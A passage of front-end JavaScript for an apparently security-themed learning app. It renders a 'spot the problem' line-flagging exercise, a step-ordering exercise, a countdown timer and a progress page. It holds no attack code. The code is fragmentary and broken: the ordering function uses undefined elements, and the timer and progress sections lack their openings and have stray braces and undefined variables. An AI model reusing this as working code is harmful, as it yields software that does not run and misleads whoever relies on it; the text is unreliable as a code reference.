      if(explain){const p=b.pairs[ri];whyEl.innerHTML='';whyEl.appendChild(el('div','why',`<b>${p[1]}</b> goes with <b>${p[0]}</b>. ${p[2]||''}`));}
    }
  }
  if(isDone(b.id)){pill.textContent='Completed before. Play again anytime.';pill.className='pill ok';}
  return c;
}

/* ---- spot the problem ---- */
function renderSpot(b){
  const c=el('div','card');
  c.appendChild(el('h3',null,`${b.title}<span class="blm">Analyze</span>`));
  if(b.intro) c.appendChild(el('p','sum',b.intro));
  const box=el('div','spot');
  const pre=el('pre');
  const flagged=new Set();
  b.lines.forEach((ln,i)=>{
    const [text,why]=ln;
    const line=el('span','sl',esc(text));
    line.addEventListener('click',()=>{
      if(box.dataset.checked)return;
      if(flagged.has(i)){flagged.delete(i);line.classList.remove('flag');}
      else{flagged.add(i);line.classList.add('flag');}
    });
    pre.appendChild(line);
  });
  box.appendChild(pre);
  c.appendChild(box);
  const row=el('div','row');
  const check=el('button','btn sm','Check');
  const reset=el('button','btn sec sm','Reset');
  const pill=el('span','pill');
  row.append(check,reset,pill);
  c.appendChild(row);
  const legend=el('div','legend','Findings are the lines that weaken the system. A struck-through red line means you flagged a safe line.');
  c.appendChild(legend);
  const whyWrap=el('div');
  c.appendChild(whyWrap);
  check.addEventListener('click',()=>{
    box.dataset.checked='1';
    const lines=[...pre.children];
    let hits=0,total=0;
    whyWrap.innerHTML='';
    b.lines.forEach((ln,i)=>{
      const [text,why]=ln;const isBad=!!why;
      const span=lines[i];span.className='sl';
      if(isBad){total++;
        if(flagged.has(i)){span.classList.add('hit');hits++;}
        else span.classList.add('miss');
        whyWrap.appendChild(el('div','why',`<b>${esc(text.trim().slice(0,42))}\u2026</b> ${why}`));
      } else if(flagged.has(i)){span.classList.add('false');}
    });
    const falses=[...flagged].filter(i=>!b.lines[i][1]).length;
    pill.textContent=`${hits} / ${total} findings`+(falses?`, ${falses} false flag${falses>1?'s':''}`:'');
    pill.className='pill'+(hits===total&&!falses?' ok':' bad');
    if(hits===total&&!falses){store.set(b.id,{done:true});refreshChrome();}
  });
  reset.addEventListener('click',()=>{renderReplace(c,renderSpot(b));});
  if(isDone(b.id)){pill.textContent='Completed before.';pill.className='pill ok';}
  return c;
}

function renderOrder(b){
  const c=el('div','card');

  if(b.intro) c.appendChild(el('p','sum',b.intro));

  wrap.append(poolH,pool,seqH,seq);
  c.appendChild(wrap);
  const order=shuffle(b.items.map((it,i)=>({it,i})));
  const chosen=[];
  function drawPool(){
    pool.innerHTML='';
    order.forEach(o=>{
      if(chosen.includes(o.i))return;
      const btn=el('button','oi',`<span class="n">+</span><span>${o.it[0]}</span>`);
      btn.addEventListener('click',()=>{chosen.push(o.i);drawPool();drawSeq();});
      pool.appendChild(btn);
    });
  }
  function drawSeq(){
    seq.innerHTML='';
    chosen.forEach((ci,pos)=>{
      const btn=el('button','oi',`<span class="n">${pos+1}</span><span>${b.items[ci][0]}</span>`);
      btn.title='Tap to remove';
      btn.addEventListener('click',()=>{chosen.splice(pos,1);drawPool();drawSeq();});
      seq.appendChild(btn);
    });
  }
  drawPool();
  const row=el('div','row');const check=el('button','btn sm','Check order');const pill=el('span','pill');row.append(check,pill);c.appendChild(row);
  const whyWrap=el('div');c.appendChild(whyWrap);
  check.addEventListener('click',()=>{
    if(chosen.length<b.items.length){pill.textContent='Place every step first';pill.className='pill bad';return;}
    let ok=true;whyWrap.innerHTML='';
    [...seq.children].forEach((node,pos)=>{
      const correct=chosen[pos]===pos;
      node.className='oi '+(correct?'ok':'off');
      if(!correct)ok=false;
    });
    pill.textContent=ok?'Perfect order':'Not quite, the numbers show your order; grey/red are out of place';
    pill.className='pill'+(ok?' ok':' bad');
    if(ok){store.set(b.id,{done:true});refreshChrome();}
    else { whyWrap.appendChild(el('div','why','Correct order with the reason for each step:')); b.items.forEach((it,i)=>whyWrap.appendChild(el('div','why',`<b>${i+1}. ${it[0]}.</b> ${it[1]}`))); }
  });
  if(isDone(b.id)){pill.textContent='Completed before.';pill.className='pill ok';}
  return c;
}

  function fmt(s){const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),x=s%60;return `${h}:${String(m).padStart(2,'0')}:${String(x).padStart(2,'0')}`;}
  function marksOff(){[m1,m2,m3].forEach(m=>m.className='pill');}

  }
  function tick(){left--;disp.textContent=fmt(Math.max(0,left));
    m1.className='pill'+(left<=total*0.5?' ok':'');m2.className='pill'+(left<=total*0.25?' ok':'');m3.className='pill'+(left<=15*60?' bad':'');
    if(left<=0){clearInterval(timer);timer=null;disp.textContent='0:00:00';}
  }
  lenInp.addEventListener('input',()=>{const v=parseInt(lenInp.value||'0',10)||0;store.set(b.id,{len:v});if(!timer)setup();});
  start.addEventListener('click',()=>{lenInp.disabled=true;if(!timer)timer=setInterval(tick,1000);});
  pause.addEventListener('click',()=>{if(timer){clearInterval(timer);timer=null;}});

    const ids=[];l.units.forEach(u=>u.blocks.forEach(b=>{if(b.id)ids.push(b.id);}));
    const done=ids.filter(isDone).length;
    const pct=ids.length?Math.round(done/ids.length*100):0;
    const card=el('div','card');
    card.style.setProperty('--accent',l.color);
    card.innerHTML=`<div class="prow"><b>${l.grade}</b><small>${done} / ${ids.length} activities</small></div><div class="pbar"><i></i></div>`;
    const bar=card.querySelector('.pbar i'); if(bar){bar.style.width=pct+'%';bar.style.background=l.color;}
    const go=el('button','btn sec sm','Open '+l.grade);
    go.addEventListener('click',()=>{current={level:l.id,unit:l.units[0].id,page:'level'};render();});
    card.appendChild(go);
    prog.appendChild(card);
  });
  main.appendChild(prog);
  // overall
  const all=allInteractiveIds();const ad=all.filter(isDone).length;const apct=all.length?Math.round(ad/all.length*100):0;
  const o=el('div','card');
  o.innerHTML=`<div class="prow"><b>Overall</b><small>${ad} / ${all.length} activities (${apct}%)</small></div><div class="pbar"><i></i></div>`;
  const obar=o.querySelector('.pbar i'); if(obar)obar.style.width=apct+'%';
  main.appendChild(o);
  const row=el('div','row');
  const reset=el('button','btn sec sm','Reset my progress');
  const pill=el('span','pill');
  let armed=false;
  reset.addEventListener('click',()=>{
    if(!armed){armed=true;reset.textContent='Tap again to confirm';pill.textContent='This clears everything saved in this browser.';pill.className='pill bad';return;}
    MEM={};store.save();pill.textContent='Cleared';pill.className='pill ok';reset.textContent='Reset my progress';armed=false;render();
  });
  row.append(reset,pill);
  main.appendChild(row);
}

/* =====================================================================
   chrome refresh (rail dots + progress badges without full nav rebuild)
   ===================================================================== */
function refreshChrome(){
  if(current.page==='level'){
    const L=levelById(current.level);
    const chips=document.querySelectorAll('.units .unit');
    L.units.forEach((u,i)=>{
      if(!chips[i])return;
      const st=unitStatus(u);
      const dot=chips[i].querySelector('.dot');
      if(dot)dot.className='dot '+st;
    });
  }
}
